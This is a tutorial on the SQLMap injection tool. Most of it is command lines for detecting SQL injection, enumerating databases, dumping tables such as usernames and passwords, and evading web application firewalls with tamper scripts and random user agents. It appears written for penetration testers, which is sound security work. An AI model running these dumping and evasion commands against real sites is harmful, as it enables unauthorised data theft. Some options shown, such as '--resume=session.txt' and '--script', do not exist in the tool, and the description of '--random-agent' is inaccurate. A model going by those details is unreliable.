### Introduction to SQLMap

#### What is SQLMap?

SQLMap is a powerful, open-source tool designed to automate the process of detecting and exploiting SQL injection vulnerabilities in web applications. It provides penetration testers and security professionals with a comprehensive set of features for identifying, assessing, and exploiting potential weaknesses related to SQL injection.

#### Key Features and Capabilities

* Automated detection of SQL injection vulnerabilities.
* Support for various database management systems (DBMS), including MySQL, PostgreSQL, MSSQL, and others.
* Capability to perform both time-based and error-based blind SQL injection attacks.
* Support for union-based and stacked queries.
* Database fingerprinting and version detection.
* Exploitation of identified vulnerabilities to extract data from databases.

### Installation

#### Downloading and Installing SQLMap

To get started with SQLMap, you can download the latest version from the official GitHub repository:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
```

#### Basic Setup and Configuration

Before using SQLMap, it's crucial to understand the basic configuration options. This includes setting the target URL, specifying parameters, and configuring any additional options. A typical command might look like this:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --dbs
```

### Basic Usage

#### Scanning a Target URL

The most basic usage of SQLMap involves scanning a target URL for SQL injection vulnerabilities. The `-u` option is used to specify the target URL:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --risk=3 --level=5
```

**Specifying Injection Points and Parameters**

SQLMap allows you to specify injection points and parameters manually. For example, to target a specific parameter, you can use the `-p` option:

```bash
python sqlmap.py -u "http://example.com/index.php" -p id --dbs
```

### Advanced Features

#### Session Management and Stateful Testing

SQLMap supports session management, allowing you to resume an interrupted scan or continue from a previously saved state. The `--resume` option is used for this purpose:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --cookie="PHPSESSID=12345" --resume=session.txt
```

#### Tampering with HTTP Requests and Responses

To evade detection or modify requests and responses, SQLMap provides the `--tamper` option. Custom tamper scripts can be used to modify data before it's sent to the server or after it's received:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --tamper=space2comment
```

### Database Enumeration

#### Extracting Information about the Database

Once SQL injection vulnerabilities are identified, SQLMap allows you to extract valuable information about the database, including its version and user privileges:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --banner
```

#### Retrieving Databases, Tables, and Columns

SQLMap supports database enumeration, allowing you to retrieve a list of databases, tables, and columns within the target system:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --dbs
```

### Exploitation

#### Exploiting SQL Injection Vulnerabilities

Once SQLMap identifies a vulnerable parameter, you can proceed to exploit it to extract data from the database. The `--dump` option is commonly used for this purpose:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --dump
```

#### Dumping Data from Databases

To dump specific data, such as usernames and passwords, you can use the `--columns` and `--dump` options:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --columns --dump
```

### Detection Evasion Techniques

#### Techniques to Evade WAFs

SQLMap provides techniques to evade detection by Web Application Firewalls (WAFs). The `--tamper` option can be utilized with specific tamper scripts designed for evasion:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --tamper=between
```

#### Anonymizing Requests

To anonymize requests and avoid blocking, SQLMap allows you to use the `--random-agent` option, which selects a random user-agent for each HTTP request:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --random-agent
```

### Automation and Scripting

#### Creating and Using Custom Scripts

SQLMap supports custom scripts for automation and specific testing scenarios. Custom scripts can be created and utilized with the `--script` option:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --script=my_custom_script.py
```
